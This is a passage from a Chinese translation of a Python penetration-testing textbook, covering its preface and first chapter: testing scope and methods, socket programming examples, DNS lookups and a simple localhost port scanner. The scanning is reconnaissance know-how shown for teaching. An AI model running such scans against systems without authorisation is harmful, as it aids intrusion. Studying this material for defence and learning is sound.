# Python 渗透测试基础知识（一）

> 原文：[`annas-archive.org/md5/D99A9F7802A11A3421FFD0540EBE69EA`](https://annas-archive.org/md5/D99A9F7802A11A3421FFD0540EBE69EA)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

这本书是一本实用指南，向您展示了使用 Python 进行渗透测试的优势，并提供了详细的代码示例。本书从探索 Python 的网络基础知识开始，然后进入网络和无线渗透测试，包括信息收集和攻击。您将学习如何构建蜜罐陷阱。随后，我们深入研究应用层的黑客攻击，从网站收集信息开始，最终涉及与网站黑客攻击相关的概念，如参数篡改、DDOS、XSS 和 SQL 注入。

# 本书适合对象

如果您是 Python 程序员、安全研究人员或具有 Python 编程基础知识并希望借助 Python 学习渗透测试的网络管理员，那么本书非常适合您。即使您是新手道德黑客领域，本书也可以帮助您发现系统中的漏洞，以便您准备应对任何类型的攻击或入侵。

# 本书内容

第一章，“Python 与渗透测试和网络”，介绍了以下章节的先决条件。本章还讨论了套接字及其方法。服务器套接字的方法定义了如何创建一个简单的服务器。

第二章，“扫描渗透测试”，介绍了如何执行网络扫描以收集有关网络、主机和主机上运行的服务的信息。您将看到一个非常快速和高效的 IP 扫描器。

第三章，“嗅探和渗透测试”，教授如何进行主动嗅探以及如何创建传输层嗅探器。您将学习特殊类型的扫描。

第四章，“网络攻击和预防”，概述了不同类型的网络攻击，如 DHCP 饥饿和交换机 MAC 洪泛。您将学习如何在客户端检测到 torrent。

第五章，“无线渗透测试”，介绍了无线帧，并解释了如何使用 Python 脚本从无线帧中获取 SSID、BSSID 和信道号等信息。在这种类型的攻击中，您将学习如何对 AP 执行渗透测试攻击。

第六章，“蜜罐-为攻击者构建陷阱”，着重介绍了如何为攻击者构建陷阱。您将学习如何从 TCP 层 2 到 TCP 层 4 构建代码。

第七章，“足迹定位 Web 服务器和 Web 应用程序”，深入探讨了 Web 服务器签名的重要性、电子邮件收集以及了解服务器签名是黑客攻击的第一步。

第八章，“客户端和 DDoS 攻击”，探讨了客户端验证以及如何绕过客户端验证。本章涵盖了四种类型的 DDoS 攻击的实施。

第九章，“渗透测试 SQL 和 XSS”，讨论了两种主要的 Web 攻击：SQL 注入和 XSS。在 SQL 注入中，您将学习如何使用 Python 脚本找到管理员登录页面。

# 为了充分利用本书

为了理解本书，读者必须具备网络基础知识、Linux 操作系统的基本知识、信息安全的良好知识和核心 Python 知识。

为了进行实验或运行代码，读者可以使用虚拟机（Vmware，虚拟盒）。对于无线渗透测试，读者可以使用无线网卡 TP-Link TL-WN722N。因为 TL-WN722N 无线网卡支持在 VMware 中运行 Kali Linux。

# 下载示例代码文件

您可以从[www.packtpub.com](http://www.packtpub.com)的帐户中下载本书的示例代码文件。如果您在其他地方购买了本书，可以访问[www.packtpub.com/support](http://www.packtpub.com/support)并注册，以便直接通过电子邮件接收文件。

您可以按照以下步骤下载代码文件：

1.  在[www.packtpub.com](http://www.packtpub.com/support)登录或注册。

1.  选择“支持”选项卡。

1.  点击代码下载和勘误。

1.  在搜索框中输入书名，然后按照屏幕上的说明操作。

文件下载完成后，请确保使用最新版本的以下软件解压缩或提取文件夹：

+   WinRAR/7-Zip for Windows

+   Zipeg/iZip/UnRarX for Mac

+   7-Zip/PeaZip for Linux

本书的代码捆绑包也托管在 GitHub 上，网址为[`github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition`](https://github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition)。如果代码有更新，将在现有的 GitHub 存储库上进行更新。

我们还有其他代码捆绑包，来自我们丰富的图书和视频目录，可在**[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)**上获得。去看看吧！

# 下载彩色图像

我们还提供了一个 PDF 文件，其中包含本书中使用的屏幕截图/图表的彩色图像。您可以在这里下载：[`www.packtpub.com/sites/default/files/downloads/PythonPenetrationTestingEssentialsSecondEdition_ColorImages.pdf`](http://www.packtpub.com/sites/default/files/downloads/PythonPenetrationTestingEssentialsSecondEdition_ColorImages.pdf)。

# 代码实例

访问以下链接查看代码运行的视频：

[`goo.gl/sBHVND`](https://goo.gl/sBHVND)

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词，数据库表名，文件夹名，文件名，文件扩展名，路径名，虚拟 URL，用户输入和 Twitter 句柄。这是一个例子："将下载的`WebStorm-10*.dmg`磁盘映像文件挂载为系统中的另一个磁盘。"

代码块设置如下：

```py
import os
response = os.popen('ping -n 1 10.0.0.1')
for line in response.readlines():
    print line,
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以粗体显示：

```py
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
i = 1
```

任何命令行输入或输出都是这样写的：

```py
python setup.py install
```

**粗体**：表示一个新术语，一个重要单词，或者您在屏幕上看到的单词。例如，菜单或对话框中的单词会以这种方式出现在文本中。这是一个例子："从管理面板中选择系统信息。"

警告或重要提示会以这种方式出现。

提示和技巧会以这种方式出现。


# 第一章：Python 与渗透测试和网络

渗透测试员和黑客是类似的术语。不同之处在于渗透测试员为组织工作以防止黑客攻击，而黑客则出于名誉、出售漏洞以获取金钱，或者利用个人仇恨的目的进行攻击。

许多训练有素的黑客通过侵入系统然后通知受害者他们的安全漏洞，从而在信息安全领域找到了工作。

当黑客为组织或公司保护其系统时，他被称为渗透测试员。渗透测试员在获得客户的合法批准后，对网络进行黑客攻击，并提交他们的发现报告。要成为渗透测试的专家，一个人应该对技术的概念有深入的了解。在本章中，我们将涵盖以下主题：

+   渗透测试的范围

+   渗透测试的必要性

+   需要测试的组件

+   优秀渗透测试员的素质

+   渗透测试的方法

+   了解你需要的测试和工具

+   网络套接字

+   服务器套接字方法

+   客户端套接字方法

+   一般的套接字方法

+   套接字的实际例子

+   套接字异常

+   有用的套接字方法

# 介绍渗透测试的范围

简而言之，渗透测试用于测试公司的信息安全措施。信息安全措施包括公司的网络、数据库、网站、面向公众的服务器、安全策略以及客户指定的其他一切。在一天结束时，渗透测试员必须提交一份详细的报告，报告中包括公司基础设施的弱点、漏洞以及特定漏洞的风险水平，并在可能的情况下提供解决方案。

# 渗透测试的必要性

有几点描述了渗透测试的重要性：

+   渗透测试识别可能暴露组织机密性的威胁

+   专家级的渗透测试为组织提供了对组织安全的全面和详细的评估

+   渗透测试通过产生大量的流量来评估网络的效率，并审查防火墙、路由器和交换机等设备的安全性

+   更改或升级现有的软件、硬件或网络设计基础设施可能导致渗透测试发现的漏洞

+   在当今世界，潜在威胁显著增加；渗透测试是一种积极的行为，以最小化被利用的机会

+   渗透测试确保是否遵循适当的安全策略

考虑一个声誉良好的电子商务公司的例子，他们通过在线业务赚钱。黑客或一群黑客在公司的网站上发现了一个漏洞并进行了攻击。公司将不得不承受巨大的损失。

# 需要测试的组件

组织在进行渗透测试之前应进行风险评估操作；这将有助于识别主要威胁，如错误配置或漏洞：

+   路由器、交换机或网关

+   面向公众的系统；网站、DMZ、电子邮件服务器和远程系统

+   DNS、防火墙、代理服务器、FTP 和 Web 服务器

应对网络安全系统的所有硬件和软件组件进行测试。

# 优秀渗透测试员的素质

以下几点描述了一个优秀的渗透测试员的素质。他们应该：

+   选择一套平衡成本和效益的测试和工具

+   遵循适当的程序，进行适当的规划和文档记录

+   为每次渗透测试建立范围，如目标、限制和程序的合理性

+   准备好展示如何利用他们发现的漏洞

+   在最终报告中清楚地说明潜在风险和发现，并在可能的情况下提供减轻风险的方法

+   始终保持更新，因为技术在迅速发展

渗透测试员使用手动技术或相关工具测试网络。市面上有很多工具可用。其中一些是开源的，一些则非常昂贵。通过编程，程序员可以制作自己的工具。通过创建自己的工具，你可以澄清自己的概念，也可以进行更多的研究和开发。如果你对渗透测试感兴趣并想制作自己的工具，那么 Python 编程语言是最好的选择，因为 Python 中有大量免费的渗透测试包，除了编程的简易性。这种简易性，再加上第三方库如 scapy 和 mechanize，可以减少代码量。在 Python 中，要编写程序，你不需要像 Java 那样定义大的类。用 Python 编写代码比用 C 更高效，而且高级库几乎可以满足任何想象得到的任务。

如果你懂一些 Python 编程并对渗透测试感兴趣，这本书非常适合你。

# 定义渗透测试的范围

在我们开始渗透测试之前，应该定义渗透测试的范围。在定义范围时应考虑以下几点：

+   你应该通过与客户协商来制定项目的范围。例如，如果 Bob（客户）想要测试组织的整个网络基础设施，那么渗透测试员 Alice 将考虑这个网络来定义渗透测试的范围。Alice 将与 Bob 商议是否应该包括任何敏感或受限制的区域。

+   你应该考虑时间、人员和金钱。

+   你应该根据渗透测试员和客户签署的协议来界定测试边界。

+   业务实践的变化可能会影响范围。例如，子网的添加，新系统组件的安装，添加或修改 Web 服务器等，可能会改变渗透测试的范围。

渗透测试的范围分为两种测试类型：

+   **非破坏性测试**：这种测试仅限于发现和执行测试，没有潜在风险。它执行以下操作：

+   扫描和识别远程系统的潜在漏洞

+   调查和验证发现

+   将漏洞与适当的利用进行映射

+   以适当的注意力利用远程系统，以避免中断

+   提供概念的证明

+   不要尝试**拒绝服务**（**DoS**）攻击

+   **破坏性测试**：这种测试可能会产生风险。它执行以下操作：

+   尝试 DoS 攻击和缓冲区溢出攻击，这可能会导致系统崩溃

# 渗透测试的方法

有三种渗透测试的方法：

+   黑盒渗透测试遵循非确定性测试的方法：

+   你将只会得到一个公司名字

+   这就像是具有外部攻击者知识的黑客

+   你不需要对系统有任何先验知识

+   这需要时间

+   白盒渗透测试遵循确定性测试的方法：

+   你将获得需要测试的基础设施的完整知识

+   这就像是作为对公司基础设施有充分了解的恶意员工在工作

+   你将获得有关公司基础设施、网络类型、公司政策、行为准则、IP 地址和 IPS/IDS 防火墙的信息

+   灰盒渗透测试遵循黑盒和白盒测试的混合方法：

+   测试人员通常只能获得客户提供的目标网络/系统的有限信息，以降低成本并减少渗透测试人员的试错。

+   它在内部执行安全评估和测试

# 介绍 Python 脚本

在你开始阅读这本书之前，你应该了解 Python 编程的基础知识，比如基本语法、变量类型、数据类型元组、列表字典、函数、字符串和方法。在[python.org/downloads/](http://python.org/downloads/)上有两个版本，3.4 和 2.7.8。

在这本书中，所有的实验和演示都是在 Python 2.7.8 版本中完成的。如果你使用 Kali 或 BackTrack 等 Linux 操作系统，那就没有问题，因为许多程序，比如无线嗅探，在 Windows 平台上无法工作。Kali Linux 也使用 2.7 版本。如果你喜欢在 Red Hat 或 CentOS 上工作，那么这个版本适合你。

大多数黑客选择这个职业是因为他们不想做编程。他们想使用工具。然而，没有编程，黑客无法提高自己的技能。每一次，他们都不得不在互联网上搜索工具。相信我，看到它的简单性之后，你会喜欢这种语言的。

# 理解你需要的测试和工具

正如你所看到的，这本书分为九章。要进行扫描和嗅探渗透测试，你将需要一个连接设备的小型网络。如果你没有实验室，你可以在你的计算机上创建虚拟机。对于无线流量分析，你应该有一个无线网络。进行网络攻击，你将需要在 Linux 平台上运行的 Apache 服务器。最好使用 CentOS 或 Red Hat 版本 5 或 6 作为 Web 服务器，因为这包含了 Apache 和 PHP 的 RPM。对于 Python 脚本，我们将使用 Wireshark 工具，这是开源的，可以在 Windows 和 Linux 平台上运行。

# 学习使用 Python 的常见测试平台

现在你将进行一些渗透测试；我希望你对网络基础知识非常熟悉，比如 IP 地址、类别子网划分、无类别子网划分、端口的含义、网络地址和广播地址。渗透测试人员必须对网络基础知识以及至少一种操作系统有所了解；如果你打算使用 Linux，那么你走对了路。在这本书中，我们将在 Windows 和 Linux 上执行我们的程序。在这本书中，将使用 Windows、CentOS 和 Kali Linux。

黑客总是喜欢在 Linux 系统上工作。因为它是免费和开源的，Kali Linux 标志着 BackTrack 的重生，就像一个黑客工具的武库。Kali Linux NetHunter 是第一个为 Nexus 设备提供的开源 Android 渗透测试平台。然而，一些工具在 Linux 和 Windows 上都可以工作，但在 Windows 上，你必须安装这些工具。我希望你对 Linux 有所了解。现在，是时候在 Python 上进行网络工作了。

# 网络套接字

网络套接字地址包含 IP 地址和端口号。简单地说，套接字是与其他计算机通信的一种方式。通过套接字，一个进程可以通过网络与另一个进程通信。

为了创建一个套接字，使用套接字模块中可用的`socket.socket()`。套接字函数的一般语法如下：

```py
s = socket.socket (socket_family, socket_type, protocol=0)
```

以下是参数的描述：

```py
socket_family: socket.AF_INET, PF_PACKET
```

`AF_INET`是 IPv4 的地址族。`PF_PACKET`在设备驱动程序层操作。Linux 的 pcap 库使用`PF_PACKET`。你将在第三章中看到更多关于`PF_PACKET`的细节，*嗅探和渗透测试*。这些参数代表传输层的地址族和协议：

```py
Socket_type : socket.SOCK_DGRAM, socket.SOCK_RAW,socket.SOCK_STREAM
```

`socket.SOCK_DGRAM`参数表示 UDP 是不可靠和无连接的，`socket.SOCK_STREAM`表示 TCP 是可靠的和双向的，基于连接的服务。我们将在第三章中讨论`socket.SOCK_RAW`，*嗅探和渗透测试*：

```py
protocol
```

通常，我们会留下这个参数；如果未指定，它将为 0。我们将在第三章中看到这个参数的用法，*嗅探和渗透测试*。

# 服务器套接字方法

在客户端-服务器架构中，有一个提供服务的集中服务器，许多客户端从集中服务器请求和接收服务。以下是您需要了解的一些方法：

+   `socket.bind(address)`: 该方法用于将地址（IP 地址，端口号）连接到套接字。在连接到地址之前，套接字必须是打开的。

+   `socket.listen(q)`: 该方法启动 TCP 监听器。`q`参数定义了最大排队连接数。

+   `socket.accept()`: 使用此方法是为了接受来自客户端的连接。在使用此方法之前，必须使用`socket.bind(address)`和`socket.listen(q)`方法。`socket.accept()`方法返回两个值，`client_socket`和`address`，其中`client_socket`是一个新的套接字对象，用于在连接上发送和接收数据，`address`是客户端的地址。稍后将看到这个的例子。

# 客户端套接字方法

专门用于客户端的方法只有以下一个：

+   `socket.connect(address)`: 该方法将客户端连接到服务器。`address`参数是服务器的地址。

# 一般的套接字方法

一般的套接字方法如下：

+   `socket.recv(bufsize)`: 该方法从套接字接收 TCP 消息。`bufsize`参数定义了它可以一次接收的最大数据量。

+   `socket.recvfrom(bufsize)`: 该方法从套接字接收数据。该方法返回一对值，第一个值给出接收到的数据，第二个值给出发送数据的套接字的地址。

+   `socket.recv_into(buffer)`: 该方法接收小于或等于`buffer`的数据。`buffer`参数由`bytearray()`方法创建。稍后我们将在示例中讨论这一点。

+   `socket.recvfrom_into(buffer)`: 该方法从套接字获取数据并将其写入缓冲区。返回值是一对（nbytes，address），其中 nbytes 是接收到的字节数，address 是发送数据的套接字的地址。

在旧版本的 Python 中使用`socket.recvfrom_into(buffer)`方法时要小心。在该方法中发现了缓冲区溢出漏洞。该漏洞的名称是 CVE-2014-1912，其漏洞于 2014 年 2 月 27 日发布。在 Python 2.5 之前的 2.7.7，3.x 之前的 3.3.4 和 3.4.x 之前的 3.4rc1 中的`Modules/socketmodule.c`中的`socket.recvfrom_into`函数中存在缓冲区溢出，允许远程攻击者通过精心制作的字符串执行任意代码。

+   `socket.send(bytes)`: 该方法用于向套接字发送数据。在发送数据之前，请确保套接字已连接到远程机器。它返回发送的字节数。

+   `socket.sendto(data, address)`: 该方法用于向套接字发送数据。通常，我们在 UDP 中使用此方法。UDP 是一种无连接的协议；因此，套接字不应连接到远程机器，地址参数指定远程机器的地址。返回值告诉我们发送的字节数。

+   `socket.sendall(data)`: 正如其名称所示，该方法将所有数据发送到套接字。在发送数据之前，请确保套接字已连接到远程机器。此方法不断传输数据，直到出现错误。如果出现错误，将引发异常，并且`socket.close()`将关闭套接字。

现在，是实践的时候了；不再是平凡的理论。

# 继续实践

首先，我们将制作一个服务器端程序，为客户端提供连接并向客户端发送消息。运行`server1.py`：

```py
import socket
host = "192.168.0.1" #Server address
port = 12345  #Port of Server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port)) #bind server 
s.listen(2) 
conn, addr = s.accept()  
print addr, "Now Connected"
conn.send("Thank you for connecting")
conn.close()
```

前面的代码非常简单；这是服务器端的最小代码。

首先导入 socket 模块并定义主机和端口号，`192.168.0.1`是服务器的 IP 地址。`Socket.AF_INET`定义了 IPv4 协议的族。`Socket.SOCK_STREAM`定义了 TCP 连接。`s.bind((host,port))`语句只接受一个参数。它将套接字绑定到主机和端口号。`s.listen(2)`语句监听连接并等待客户端。`conn, addr = s.accept()`语句返回两个值：`conn`和`addr`。`conn`套接字是客户端套接字，正如我们之前讨论的那样。`conn.send()`函数将消息发送给客户端。最后，`conn.close()`关闭套接字。通过以下示例和截图，您将更好地理解`conn`。

这是`server1.py`程序的输出：

```py
  G:PythonNetworking>python server1.py
```

现在，服务器处于监听模式，并且正在等待客户端。

让我们看看客户端代码。运行`client1.py`：

```py
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.0.1"  # server address
port =12345  #server port 
s.connect((host,port)) 
print s.recv(1024)
s.send("Hello Server")
s.close()
```

在上面的代码中，有两个新方法，`s.connect((host,port))`，它将客户端连接到服务器，以及`s.recv(1024)`，它接收服务器发送的字符串。

`client.py`的输出和服务器的响应如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/14f05721-e8ce-4b8f-bb26-5894fa0c874e.png)

上面输出的截图显示服务器接受了来自`192.168.0.11`的连接。不要被看到端口`1789`所困惑；这是客户端的随机端口。当服务器向客户端发送消息时，它使用前面提到的`conn`套接字，这个`conn`套接字包含客户端的 IP 地址和端口号。

以下图表显示了客户端如何接受来自服务器的连接。服务器处于监听模式，客户端连接到服务器。当再次运行服务器和客户端程序时，随机端口会发生变化。对于客户端，服务器端口**12345**是目标端口，对于服务器，客户端随机端口**1789**是目标端口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/fd35ccc8-43e5-4dd8-9331-43fd588bcc09.png)

TCP 通信

您可以使用`while`循环扩展服务器的功能，如下面的程序所示。运行`server2.py`程序：

```py
import socket 
host = "192.168.0.1"
port = 12345
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(2)
while True:
  conn, addr = s.accept()
  print addr, "Now Connected"
  conn.send("Thank you for connecting")
  conn.close()
```

上面的代码与前一个代码相同，只是添加了无限的`while`循环。

运行`server2.py`程序，并从客户端运行`client1.py`。

`server2.py`的输出如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/6b8299e5-1db4-489c-8c82-f858eb2cbc01.png)

一个服务器可以为多个客户端提供服务。`while`循环使服务器程序保持运行，并且不允许代码结束。您可以为`while`循环设置连接限制；例如，设置`while i>10`并且每次连接增加`i`。

在继续下一个例子之前，应该理解`bytearray`的概念。`bytearray`数组是一个可变的无符号整数序列，范围在 0 到 255 之间。您可以删除、插入或替换任意值或切片。可以通过调用内置的`bytearray`数组来创建`bytearray`数组的对象。

`bytearray`的一般语法如下：

```py
bytearray([source[, encoding[, errors]]])
```

让我们用一个例子来说明这一点：

```py
>>> m = bytearray("Mohit Mohit")
>>> m[1]
111
>>> m[0]
77
>>> m[:5]= "Hello"
>>> m
bytearray(b'Hello Mohit')
>>>
```

这是对`bytearray`的切片的一个例子。

现在，让我们看看`bytearray()`上的`split`操作：

```py
>>> m = bytearray("Hello Mohit")
>>> m
bytearray(b'Hello Mohit')
>>> m.split()
[bytearray(b'Hello'), bytearray(b'Mohit')]
```

以下是`bytearray()`上的`append`操作：

```py
>>> m.append(33)
>>> m
bytearray(b'Hello Mohit!')
>>> bytearray(b'Hello World!')
```

下一个例子是`s.recv_into(buff)`。在这个例子中，我们将使用`bytearray()`来创建一个缓冲区来存储数据。

首先运行服务器端代码。运行`server3.py`：

```py
import socket
host = "192.168.0.1"
port = 12345
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
conn, addr = s.accept()
print "connected by", addr
conn.send("Thanks")
conn.close()
```

上面的程序与前一个程序相同。在这个程序中，服务器发送`Thanks`；六个字符。

让我们运行客户端程序。运行`client3.py`：

```py
import socket
host = "192.168.0.1"
port = 12345
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
buf = bytearray("-" * 30) # buffer created
print "Number of Bytes ",s.recv_into(buf) 
print buf
s.close
```

在上面的程序中，使用`bytearray()`创建了一个`buf`参数。`s.recv_into(buf)`语句给出了接收到的字节数。`buf`参数给出了接收到的字符串。

`client3.py`和`server3.py`的输出如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/3632eaee-6f83-42d3-8263-8ba308f07af7.png)

我们的客户端程序成功接收了字符串`Thanks`的 6 个字节。到目前为止，您应该对`bytearray()`有所了解。我希望您会记得它。

这次，我将创建一个 UDP 套接字。

运行`udp1.py`，我们将逐行讨论代码：

```py
import socket
host = "192.168.0.1"
port = 12346
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((host,port))
data, addr = s.recvfrom(1024)
print "received from ",addr
print "obtained ", data
s.close()
```

`socket.SOCK_DGRAM`创建了一个 UDP 套接字，而`data, addr = s.recvfrom(1024)`返回了两个东西，第一个是数据，第二个是源地址。

现在，看看客户端的准备工作。运行`udp2.py`：

```py
import socket
host = "192.168.0.1"
port = 12346
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print s.sendto("hello all",(host,port))
s.close()
```

在这里，我使用了 UDP 套接字和`s.sendto()`方法，如您在`socket.sendto()`的定义中所看到的。您将知道 UDP 是一种无连接协议，因此这里不需要建立连接。

以下截图显示了`udp1.py`（UDP 服务器）和`udp2.py`（UDP 客户端）的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/77906a5b-5ba5-43ef-ad49-5b516fde9a16.png)

服务器程序成功接收了数据。

假设服务器正在运行，并且没有客户端开始连接，并且服务器将一直在监听。因此，为了避免这种情况，使用`socket.settimeout(value)`。

通常，我们给一个整数值；如果我给`5`作为值，这意味着等待五秒钟。如果操作在五秒钟内没有完成，那么将引发超时异常。您也可以提供非负浮点值。

例如，让我们看看以下代码：

```py
import socket
host = "192.168.0.1"
port = 12346
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((host,port))
s.settimeout(5)
data, addr = s.recvfrom(1024)
print "recevied from ",addr
print "obtained ", data
s.close()
```

我添加了一行额外的代码，即`s.settimeout(5)`。程序等待五秒钟；只有在那之后才会给我们一个错误消息。运行`udptime1.py`。

输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/ff7e8798-e580-437c-bdc4-e4666fb5b71a.png)

程序显示了一个错误；但是，如果它给出一个错误消息，那就不好看了。程序应该处理异常。

# 套接字异常

为了处理异常，我们将使用 try 和 except 块。以下示例将告诉您如何处理异常。运行`udptime2.py`：

```py
import socket
host = "192.168.0.1"
port = 12346
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:

  s.bind((host,port))
  s.settimeout(5)
  data, addr = s.recvfrom(1024)
  print "recevied from ",addr
  print "obtained ", data
  s.close()

except socket.timeout :
  print "Client not connected"
  s.close()
```

输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/2ea24b23-fc29-47b0-b990-9c728967aec7.png)

在 try 块中，我放置了我的代码，从 except 块中，如果发生任何异常，将打印一个自定义消息。

Python 的套接字库定义了不同类型的异常，用于不同的错误。这些异常在这里描述：

+   `exception socket.herror`：此块捕获与地址相关的错误。

+   `exception socket.timeout`：此块捕获套接字启用`settimeout()`的超时发生时的异常。在前面的例子中，您可以看到我们使用了`socket.timeout`。

+   `exception socket.gaierror`：此块捕获由`getaddrinfo()`和`getnameinfo()`引发的任何异常。

+   `exception socket.error`：此块捕获任何与套接字相关的错误。如果您对任何异常不确定，可以使用此功能。换句话说，您可以说它是一个通用块，可以捕获任何类型的异常。

下载示例代码

您可以从[`www.packtpub.com`](http://www.packtpub.com)的帐户中下载示例代码文件，以获取您购买的所有 Packt Publishing 图书。如果您在其他地方购买了本书，可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，以便直接通过电子邮件接收文件。

# 有用的套接字方法

到目前为止，您已经了解了套接字和客户端-服务器架构。在这个级别上，您可以制作一个小型的网络程序。但是，本书的目的是测试网络并收集信息。Python 提供了非常美丽和有用的方法来收集信息。首先，导入套接字，然后使用这些方法：

+   `socket.gethostbyname(hostname)`：此方法将主机名转换为 IPv4 地址格式。IPv4 地址以字符串形式返回。这是一个例子：

```py
 >>> import socket>>>   
       socket.gethostbyname('thapar.edu')'220.227.15.55'>>>>>>   
       socket.gethostbyname('google.com')'173.194.126.64'>>>
```

我知道您正在考虑`nslookup`命令。稍后，您将看到更多的魔法。

+   `socket.gethostbyname_ex(name)`：此方法将主机名转换为 IPv4 地址模式。然而，与前一种方法相比的优势在于它给出了域名的所有 IP 地址。它返回一个元组（主机名，规范名称和 IP_addrlist），其中主机名由我们给出，规范名称是服务器的规范主机名（可能为空）的列表，IP_addrlist 是同一主机名的所有可用 IP 地址的列表。通常，一个域名托管在许多 IP 地址上，以平衡服务器的负载。不幸的是，这种方法不适用于 IPv6。我希望你对元组、列表和字典很熟悉。让我们看一个例子：

```py
 >>> socket.gethostbyname_ex('thapar.edu')('thapar.edu', [],  
       ['14.139.242.100', '220.227.15.55'])>>> 
       socket.gethostbyname_ex('google.com')>>>('google.com', [], 
       ['173.194.36.64', '173.194.36.71', '173.194.36.73',   
       '173.194.36.70', 
       '173.194.36.78', '173.194.36.66', '173.194.36.65', 
       '173.194.36.68', 
       '173.194.36.69', '173.194.36.72', '173.194.36.67'])>>>
```

它为一个域名返回许多 IP 地址。这意味着一个域名如`thapar.edu`或`google.com`在多个 IP 上运行。

+   `socket.gethostname()`：返回 Python 解释器当前运行的系统的主机名：

```py
 >>> socket.gethostname()'eXtreme'
```

使用套接字模块来获取当前机器的 IP 地址，可以使用以下技巧：`gethostbyname(gethostname())`：

```py
 >>> socket.gethostbyname(socket.gethostname())'192.168.10.1'>>>
```

您知道我们的计算机有许多接口。如果您想知道所有接口的 IP 地址，可以使用扩展接口：。

```py
 >>> socket.gethostbyname_ex(socket.gethostname())('eXtreme', [], 
 ['10.0.0.10', '192.168.10.1', '192.168.0.1'])>>>
```

它返回一个包含三个元素的元组，第一个是机器名，第二个是主机名的别名列表（在这种情况下为空），第三个是接口的 IP 地址列表。

+   `socket.getfqdn([name])`：如果可用，用于查找完全合格的域名。完全合格的域名由主机名和域名组成；例如，`beta`可能是主机名，`example.com`可能是域名。**完全合格的域名**（**FQDN**）变成了`beta.example.com`：

```py
 >>> socket.getfqdn('facebook.com')'edge-star-shv-12- 
 frc3.facebook.com'
```

在前面的例子中，`edge-star-shv-12-frc3`是主机名，`facebook.com`是域名。在下面的例子中，`thapar.edu`的 FQDN 不可用：

```py
 >>> socket.getfqdn('thapar.edu')'thapar.edu'
```

如果名称参数为空，它将返回当前机器的名称：

```py
 >>> socket.getfqdn()'eXtreme'>>>
```

+   `socket.gethostbyaddr(ip_address)`：这就像是对名称的*反向*查找。它返回一个元组（主机名，规范名称和 IP_addrlist），其中主机名是响应给定`ip_address`的主机名，规范名称是同一地址的规范名称（可能为空）的列表，IP_addrlist 是同一主机上同一网络接口的 IP 地址列表：

```py
 >>> socket.gethostbyaddr('173.194.36.71')('del01s06-in-
      f7.1e100.net', [], ['173.194.36.71'])>>>    
      socket.gethostbyaddr('119.18.50.66')Traceback (most recent call   
      last):  File "<pyshell#9>", line 1, in <module>    
      socket.gethostbyaddr('119.18.50.66')herror: [Errno 11004] host 
      not found
```

它显示了最后一个查询中的错误，因为没有反向 DNS 查找。

+   `socket.getservbyname(servicename[, protocol_name])`：这将任何协议名称转换为相应的端口号。协议名称是可选的，可以是 TCP 或 UDP。例如，DNS 服务使用 TCP 和 UDP 连接。如果没有给出协议名称，任何协议都可以匹配：

```py
 >>> import socket>>> socket.getservbyname('http')80>>>   
      socket.getservbyname('smtp','tcp')25>>>
```

+   `socket.getservbyport(port[, protocol_name])`：这将互联网端口号转换为相应的服务名称。协议名称是可选的，可以是 TCP 或 UDP：

```py
 >>> socket.getservbyport(80)'http'>>>    
      socket.getservbyport(23)'telnet'>>>    
      socket.getservbyport(445)'microsoft-ds'>>>
```

+   `socket.connect_ex(address)`：此方法返回一个错误指示器。如果成功，它返回`0`；否则，它返回`errno`变量。您可以利用这个函数来扫描端口。运行`connect_ex.py`程序：

```py
      import socket
      rmip ='127.0.0.1'
      portlist = [22,23,80,912,135,445,20]

      for port in portlist:
      sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      result = sock.connect_ex((rmip,port))
      print port,":", result
      sock.close()
```

输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/3dbc81c8-458a-4fb5-bed1-9981140d834d.png)

前面的程序输出显示端口`80`，`912`，`135`和`445`是开放的。这是一个基本的端口扫描程序。程序正在使用 IP 地址`127.0.0.1`；这是一个环回地址，所以不可能有任何连接问题。然而，当您遇到问题时，在另一台设备上执行此操作，并使用一个大的端口列表。这时，您将需要使用`socket.settimeout(value)`：

```py
socket.getaddrinfo(host, port[, family[, socktype[, proto[, flags]]]])
```

这个套接字方法将主机和端口参数转换为五元组的序列。

让我们看下面的例子：

```py
   >>> import socket
   >>> socket.getaddrinfo('www.thapar.edu', 'http')
   [(2, 1, 0, '', ('220.227.15.47', 80)), (2, 1, 0, '',  
   ('14.139.242.100', 80))]
   >>>
```

输出`2`表示家族，`1`表示套接字类型，`0`表示协议，`''`表示规范名称，`('220.227.15.47', 80)`表示`2`套接字地址。然而，这个数字很难理解。打开套接字的目录。

使用以下代码以可读的形式找到结果：

```py
import socket
def get_protnumber(prefix):
  return dict( (getattr(socket, a), a)
    for a in dir(socket)
